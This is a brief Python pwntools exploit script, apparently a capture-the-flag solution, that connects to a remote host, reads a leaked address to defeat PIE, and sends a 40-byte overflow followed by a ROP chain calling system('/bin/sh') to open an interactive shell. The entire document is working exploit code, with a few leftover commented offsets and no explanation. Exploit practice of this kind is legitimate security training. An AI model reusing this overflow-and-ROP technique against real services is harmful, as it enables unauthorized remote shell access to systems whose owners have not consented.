from pwn import *

#p = process("./pltme")
p = remote("207.154.239.148", 1341)
binary = context.binary = ELF("./pltme")

p.recvuntil(b'Leak: ')
leak = int(p.recvline().strip(), 16)

mainOS = binary.sym.main
leak = leak- mainOS

poprdi = leak + 0x012f3
simpret = leak + 0x0101a
binsh = leak + 0x0200c
callsys = leak + binary.plt.system

#rdi_off = main + 0xc5
#ret_off = main - 0x214
#bin_off = main + 0xdde
#sys = main + 0x1aa

#rdi: 0x00000000000012f3
#ret: 0x000000000000101a
#binsh: 0x0000200c
#main: 0x0000122e

#callsys: 0x1084
#main when ran: 0x555f587891aa

payload = b'A'*40 + p64(poprdi) + p64(binsh) + p64(simpret) + p64(callsys)

p.sendline(payload)
p.interactive()
